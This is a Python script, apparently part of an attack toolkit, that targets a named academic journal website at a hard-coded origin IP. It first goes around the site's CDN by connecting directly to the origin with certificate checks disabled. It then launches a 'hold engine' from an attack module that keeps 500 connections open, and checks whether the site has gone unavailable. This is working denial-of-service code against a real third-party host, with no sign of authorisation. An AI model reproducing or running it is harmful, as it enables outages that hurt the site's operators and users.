"""Test CDN bypass + hold engine for ojs.phb.ac.id"""
import sys, socket, ssl, http.client, time, threading, queue
sys.path.insert(0, '.')

target = 'ojs.phb.ac.id'
origin_ip = '36.94.70.233'  # from DNS

print('=== 1. DNS matches origin IP ===')
print(f'  {target} -> {origin_ip}')

print('\n=== 2. Origin bypass: GET via IP with Host header ===')
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
try:
    sock = socket.socket()
    sock.settimeout(5)
    sock.connect((origin_ip, 443))
    ssl_sock = ctx.wrap_socket(sock, server_hostname=target)
    # HTTP/1.1 GET
    req = (
        f"GET / HTTP/1.1\r\n"
        f"Host: {target}\r\n"
        f"User-Agent: Mozilla/5.0\r\n"
        f"Accept: */*\r\n"
        f"Connection: close\r\n\r\n"
    ).encode()
    ssl_sock.sendall(req)
    resp = ssl_sock.read(4096)
    # Parse status line
    lines = resp.decode('utf-8', errors='replace').split('\r\n')
    print(f'  Response: {lines[0] if lines else "empty"}')
    for line in lines[1:]:
        if line.startswith('Server:') or line.startswith('Set-Cookie:'):
            print(f'  {line}')
    ssl_sock.close()
    print('  [+] Origin bypass WORKS')
except Exception as e:
    print(f'  Error: {e}')

print('\n=== 3. Hold Engine Test: open 500 connections ===')
from core.attack.engines.h2_hold_engine import run_hold_worker

stop = threading.Event()
q = queue.Queue()
threads = []
for wi in range(5):
    t = threading.Thread(
        target=run_hold_worker,
        kwargs=dict(
            target_url=f'https://{target}/',
            duration=15, worker_id=wi,
            stats_queue=q, stop_event=stop,
            host_header=target, connections=100,
        ),
        daemon=True,
    )
    t.start()
    threads.append(t)

time.sleep(5)
# Check if connections are alive
alive = sum(1 for t in threads if t.is_alive())
print(f'  Workers alive after 5s: {alive}/{len(threads)}')

# Try to access the site while holding connections
import urllib.request
try:
    req = urllib.request.Request(f'https://{target}/', 
        headers={'User-Agent': 'Mozilla/5.0'},
        method='GET')
    resp = urllib.request.urlopen(req, timeout=5)
    print(f'  Site still reachable: {resp.status}')
    resp.read()
except Exception as e:
    print(f'  Site UNAVAILABLE: {e}')

stop.set()
for t in threads:
    t.join(timeout=3)
print('  Hold test complete')
